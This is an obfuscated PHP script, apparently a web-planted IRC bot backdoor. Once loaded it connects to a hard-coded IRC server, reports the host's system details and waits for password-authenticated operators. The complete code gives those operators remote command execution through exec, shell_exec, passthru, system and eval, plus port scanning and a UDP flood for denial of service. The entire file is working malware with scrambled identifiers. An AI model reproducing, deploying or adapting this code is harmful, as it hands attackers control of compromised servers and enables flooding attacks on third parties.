<?php set_time_limit(0); error_reporting(0);  class rFnvFVFRrVrjnjrZB {

 var $RnJNbrzRzzZVjJj = array("nZfVrjjjbbvRNnnn"=>"gangbang.angels-agency.nl",
                     "FBvR"=>"23232",
                     "FnRvN"=>"scary",
                     "nVfZbr"=>"13",
                     "xpDHl"=>"#wWw#",
                     "jnb"=>"scan",
                     "rnrnFvBVR"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "nJJVfjNVjJ"=>".",
                     "BbRrFBjBbRj"=>"a87710e60dee7645081a8fc2fab74dbd");
                      var $fvVRnBnZZRBVjvFnzj = array(); 
 function UqeiqyqeuQIMMeAIUiM() {
	if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $hxxlpXdTlXD = "\0034ON\003"; } else { $hxxlpXdTlXD = "\0039OFF\003"; }

	$lDlPpPXt = php_uname();
	if($lDlPpPXt == "") { $rVsoDL = "\00315---\003"; } else { $rVsoDL = "\00315".$lDlPpPXt."\003"; }
		 
	 $FFwk = "\00315http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\003";
	 
	 $XTGoW =  getcwd()."";
	 
	 $PwSS = "\00315".$XTGoW."\003";

	$sSGgsKgoWG = fileperms("$XTGoW");

	if (($sSGgsKgoWG & 0xC000) == 0xC000) { $cgCcGsoGGOG = 's';
	} elseif (($sSGgsKgoWG & 0xA000) == 0xA000) { $cgCcGsoGGOG = 'l';
	} elseif (($sSGgsKgoWG & 0x8000) == 0x8000) { $cgCcGsoGGOG = '-';
	} elseif (($sSGgsKgoWG & 0x6000) == 0x6000) { $cgCcGsoGGOG = 'b';
	} elseif (($sSGgsKgoWG & 0x4000) == 0x4000) { $cgCcGsoGGOG = 'd';
	} elseif (($sSGgsKgoWG & 0x2000) == 0x2000) { $cgCcGsoGGOG = 'c';
	} elseif (($sSGgsKgoWG & 0x1000) == 0x1000) { $cgCcGsoGGOG = 'p';
	} else { $cgCcGsoGGOG = 'u'; }

	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0100) ? 'r' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0080) ? 'w' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0040) ?	(($sSGgsKgoWG & 0x0800) ? 's' : 'x' ) :	(($sSGgsKgoWG & 0x0800) ? 'S' : '-'));

	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0020) ? 'r' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0010) ? 'w' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0008) ?	(($sSGgsKgoWG & 0x0400) ? 's' : 'x' ) :	(($sSGgsKgoWG & 0x0400) ? 'S' : '-'));

	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0004) ? 'r' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0002) ? 'w' : '-');
	$cgCcGsoGGOG .= (($sSGgsKgoWG & 0x0001) ?	(($sSGgsKgoWG & 0x0200) ? 't' : 'x' ) :	(($sSGgsKgoWG & 0x0200) ? 'T' : '-'));
			
	$bBTD = "\00315".$cgCcGsoGGOG."\003";

	$this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"\00314[SAFE:\003\002 $hxxlpXdTlXD\002\00314]\00315 $FFwk \00314[pwd:]\00315 $PwSS \00314(\003$bBTD\00314) [uname:]\00315 $rVsoDL");
 } function uiAQmaAMyQq($Pd,$phd)
 {
    $this->iyyuAyu("PRIVMSG $Pd :$phd");
 }function AeayYUiiaqmeqm() 
 { 
    while(!feof($this->wOkwOcogw)) 
    { 
       $this->uemmi = trim(fgets($this->wOkwOcogw,512)); 
       $rJZJvBFZvvNbF = explode(" ",$this->uemmi); 
       if(substr($this->uemmi,0,6)=="PING :") 
       { 
          $this->iyyuAyu("PONG :".substr($this->uemmi,6)); 
       } 
       if(isset($rJZJvBFZvvNbF[1]) && $rJZJvBFZvvNbF[1] =="004") 
       { 
          $this->iyyuAyu("JOIN ".$this->RnJNbrzRzzZVjJj['xpDHl']." ".$this->RnJNbrzRzzZVjJj['jnb']."");
          $this->iMEYqQ($this->RnJNbrzRzzZVjJj['xpDHl'],$this->RnJNbrzRzzZVjJj['jnb']);
          $this->UqeiqyqeuQIMMeAIUiM();
       } 
       if(isset($rJZJvBFZvvNbF[1]) && $rJZJvBFZvvNbF[1]=="433") 
       { 
          $this->UyuyYmUIimAeEaEi(); 
       }
       if($this->uemmi != $nJz_pDL) 
       { 
          $FJRrbzzbbRVfrF = array(); 
          $WOC = substr(strstr($this->uemmi," :"),2); 
          $wOCC = explode(" ",$WOC); 
          $oosWg = explode("!",$rJZJvBFZvvNbF[0]); 
          $wccSSo = explode("@",$oosWg[1]); 
          $wccSSo = $wccSSo[1]; 
          $oosWg = substr($oosWg[0],1); 
          $SGkOWOg = $rJZJvBFZvvNbF[0]; 
          if($wOCC[0]==$this->oosWg) 
          { 
           for($p=0;$p<count($wOCC);$p++) 
              $FJRrbzzbbRVfrF[$p] = $wOCC[$p+1]; 
          } 
          else 
          { 
           for($p=0;$p<count($wOCC);$p++) 
              $FJRrbzzbbRVfrF[$p] = $wOCC[$p]; 
          } 
          if(count($rJZJvBFZvvNbF)>2) 
          { 
             switch($rJZJvBFZvvNbF[1]) 
             { 
                case "QUIT": 
                   if($this->iMIIaEyAMeeE($SGkOWOg)) 
                   { 
                      $this->EaiYuQeM($SGkOWOg); 
                   } 
                break; 
                case "PART": 
                   if($this->iMIIaEyAMeeE($SGkOWOg)) 
                   { 
                      $this->EaiYuQeM($SGkOWOg); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->iMIIaEyAMeeE($SGkOWOg) && (md5($wccSSo) == $this->RnJNbrzRzzZVjJj['BbRrFBjBbRj'] || $this->RnJNbrzRzzZVjJj['BbRrFBjBbRj'] == "*")) 
                   { 
                      if(substr($FJRrbzzbbRVfrF[0],0,1)==$this->RnJNbrzRzzZVjJj['nJJVfjNVjJ']) 
                      { 
                         switch(substr($FJRrbzzbbRVfrF[0],1)) 
                         { 
                            case "user": 
                              if(md5($FJRrbzzbbRVfrF[1])==$this->RnJNbrzRzzZVjJj['rnrnFvBVR']) 
                              { 
                                 $this->uqYQuqYIe($SGkOWOg);
                              } 
                              else 
                              { 
                                 $this->eUUMQiayIA($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002Auth\002]: Fout password $oosWg idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   }
                   elseif($this->iMIIaEyAMeeE($SGkOWOg)) 
                   { 
                      if(substr($FJRrbzzbbRVfrF[0],0,1)==$this->RnJNbrzRzzZVjJj['nJJVfjNVjJ']) 
                      { 
                         switch(substr($FJRrbzzbbRVfrF[0],1)) 
                         {                            case "exec": 
                               $wGCcWsSoCGGW = substr(strstr($WOC,$FJRrbzzbbRVfrF[0]),strlen($FJRrbzzbbRVfrF[0])+1); 
                               $sOccCWOWkkswW = exec($wGCcWsSoCGGW); 
                               $sOCkWwKcCkwsGo = explode("\n",$sOccCWOWkkswW); 
                               for($p=0;$p<count($sOCkWwKcCkwsGo);$p++) 
                                  if($sOCkWwKcCkwsGo[$p]!=NULL) 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"      : ".trim($sOCkWwKcCkwsGo[$p])); 
                            break;                            case "dns": 
                               if(isset($FJRrbzzbbRVfrF[1])) 
                               { 
                                  $Wk = explode(".",$FJRrbzzbbRVfrF[1]); 
                                  if(count($Wk)==4 && is_numeric($Wk[0]) && is_numeric($Wk[1]) && is_numeric($Wk[2]) && is_numeric($Wk[3])) 
                                  { 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002dns\002]: ".$FJRrbzzbbRVfrF[1]." => ".gethostbyaddr($FJRrbzzbbRVfrF[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002dns\002]: ".$FJRrbzzbbRVfrF[1]." => ".gethostbyname($FJRrbzzbbRVfrF[1])); 
                                  } 
                               } 
                            break;                            case "logout": 
                               $this->EaiYuQeM($SGkOWOg); 
                               $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002Auth\002]\00314 Je bent nu uitgelogt $oosWg"); 
                            break;                            case "die": 
                               $this->iyyuAyu("QUIT :die command from $oosWg");
                               fclose($this->wOkwOcogw); 
                               exit;                            case "udpflood": 
                               if(count($FJRrbzzbbRVfrF)>3) 
                               { 
                                  $this->yQuMIaYuaEAEIiymaU($FJRrbzzbbRVfrF[1],$FJRrbzzbbRVfrF[2],$FJRrbzzbbRVfrF[3]); 
                               } 
                            break;                            case "pscan": 
                               if(count($FJRrbzzbbRVfrF) > 2) 
                               { 
                                  if(fsockopen($FJRrbzzbbRVfrF[1],$FJRrbzzbbRVfrF[2],$e,$s,15)) 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002pscan\002]: ".$FJRrbzzbbRVfrF[1].":".$FJRrbzzbbRVfrF[2]." is \2open\2"); 
                                  else 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002pscan\002]: ".$FJRrbzzbbRVfrF[1].":".$FJRrbzzbbRVfrF[2]." is \2closed\2"); 
                               } 
                            break;                            case "restart": 
                               $this->iyyuAyu("QUIT :gerestart door $oosWg");
                               fclose($this->wOkwOcogw); 
                               $this->yUuiuuqYQaYeQ(); 
                            break;                            case "sexec":
                               $wGCcWsSoCGGW = substr(strstr($WOC,$FJRrbzzbbRVfrF[0]),strlen($FJRrbzzbbRVfrF[0])+1); 
                               $sOccCWOWkkswW = shell_exec($wGCcWsSoCGGW); 
                               $sOCkWwKcCkwsGo = explode("\n",$sOccCWOWkkswW); 
                               for($p=0;$p<count($sOCkWwKcCkwsGo);$p++) 
                                  if($sOCkWwKcCkwsGo[$p]!=NULL) 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"      : ".trim($sOCkWwKcCkwsGo[$p])); 
                            break;                            case "passthru": 
                               $wGCcWsSoCGGW = substr(strstr($WOC,$FJRrbzzbbRVfrF[0]),strlen($FJRrbzzbbRVfrF[0])+1); 

                               $sOccCWOWkkswW = passthru($wGCcWsSoCGGW); 
                               $sOCkWwKcCkwsGo = explode("\n",$sOccCWOWkkswW); 
                               for($p=0;$p<count($sOCkWwKcCkwsGo);$p++) 
                                  if($sOCkWwKcCkwsGo[$p]!=NULL) 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"      : ".trim($sOCkWwKcCkwsGo[$p])); 
                            break;                            case "eval":
                              $eval = eval(substr(strstr($WOC,$FJRrbzzbbRVfrF[1]),strlen($FJRrbzzbbRVfrF[1])));
                            break;                            case "system": 
                               $wGCcWsSoCGGW = substr(strstr($WOC,$FJRrbzzbbRVfrF[0]),strlen($FJRrbzzbbRVfrF[0])+1); 
                               $sOccCWOWkkswW = system($wGCcWsSoCGGW); 
                               $sOCkWwKcCkwsGo = explode("\n",$sOccCWOWkkswW); 
                               for($p=0;$p<count($sOCkWwKcCkwsGo);$p++) 
                                  if($sOCkWwKcCkwsGo[$p]!=NULL) 
                                     $this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"      : ".trim($sOCkWwKcCkwsGo[$p])); 
                            break;                            case "rndnick": 
                               $this->UyuyYmUIimAeEaEi(); 
                            break;                            case "raw":
                               $this->iyyuAyu(strstr($WOC,$FJRrbzzbbRVfrF[1])); 
                            break;                            case "info":
                               $this->UqeiqyqeuQIMMeAIUiM();
                            break;                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $nJz_pDL = $this->uemmi; 
    } 
    $this->yUuiuuqYQaYeQ(); 
 } function iMEYqQ($xpDHl,$jnb=NULL) 
 { 
    $this->iyyuAyu("JOIN $xpDHl $jnb"); 
 } function UequEQmQAqemYyaQY() {
  $HTHPTh = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';	
  $TPxxtlH = strlen($HTHPTh);
  for($p=0;$p<6;$p++) {
	$mIq .= $HTHPTh[rand(0,$TPxxtlH-1)];
  }
  if(php_uname() == "") { $lDlPpPXt = "---"; } else { $lDlPpPXt = php_uname(); }
  $this->iyyuAyu("USER ".$mIq."-go 127.0.0.1 localhost :".$lDlPpPXt."");
 } function iyyuAyu($phd) 
 { 
    fwrite($this->wOkwOcogw,"$phd\r\n"); 
 } function UyuyYmUIimAeEaEi() {
  $HTHPTh = '[abcdefghijklm)nopqrstuvwxyz_ABCDEFGHIJKLM(NOPQRSTUVWXYZ-0123456789]';	
  $TPxxtlH = strlen($HTHPTh);
  for($p=0;$p<$this->RnJNbrzRzzZVjJj['nVfZbr'];$p++) {
	$mIq .= $HTHPTh[rand(0,$TPxxtlH-1)];
  }
  $this->iyyuAyu("NICK ".$mIq."");
 } function eUUMQiayIA($Pd,$phd)
 {
    $this->iyyuAyu("NOTICE $Pd :$phd");
 } function EaiYuQeM($LHxt) 
 { 
    unset($this->fvVRnBnZZRBVjvFnzj[$LHxt]); 
 } function uqYQuqYIe($LHxt) 
 { 
    $this->fvVRnBnZZRBVjvFnzj[$LHxt] = true; 
 } function yUuiuuqYQaYeQ() 
 { 
    if(!($this->wOkwOcogw = fsockopen($this->RnJNbrzRzzZVjJj['nZfVrjjjbbvRNnnn'],$this->RnJNbrzRzzZVjJj['FBvR'],$e,$s,30))) 
    $this->yUuiuuqYQaYeQ(); 
    $this->UequEQmQAqemYyaQY();
    if(strlen($this->RnJNbrzRzzZVjJj['FnRvN'])>0) 
    $this->iyyuAyu("PASS ".$this->RnJNbrzRzzZVjJj['FnRvN']);
    $this->UyuyYmUIimAeEaEi();
    $this->AeayYUiiaqmeqm();
 } function yQuMIaYuaEAEIiymaU($LHxt,$ThHxtxHPPH,$UUUe) {
	$this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002UdpFlood Gestart!\002]"); 
	$PTtHTxpDP = "";
	for($p=0;$p<$ThHxtxHPPH;$p++) { $PTtHTxpDP .= chr(mt_rand(1,256)); }
	$hLtHd = time();
	$p = 0;
	while(time()-$hLtHd < $UUUe) {
		$ND=fsockopen("udp://".$LHxt,mt_rand(0,6000),$e,$s,5);
      	fwrite($ND,$PTtHTxpDP);
       	fclose($ND);
		$p++;
	}
	$BGX = $p * $ThHxtxHPPH;
	$BGX = $BGX / 1048576;
	$Tfg = $BGX / $UUUe;
	$Tfg = round($Tfg);
	$BGX = round($BGX);
	$this->uiAQmaAMyQq($this->RnJNbrzRzzZVjJj['xpDHl'],"[\002UdpFlood Afgerond!\002]: $BGX MB verzonden / gemiddelde: $Tfg MB/s ");
 } function iMIIaEyAMeeE($LHxt) 
 { 
    if(isset($this->fvVRnBnZZRBVjvFnzj[$LHxt])) 
       return 1; 
    else 
       return 0; 
 }}
$GKksKWow = new rFnvFVFRrVrjnjrZB;
$GKksKWow->yUuiuuqYQaYeQ(); ?>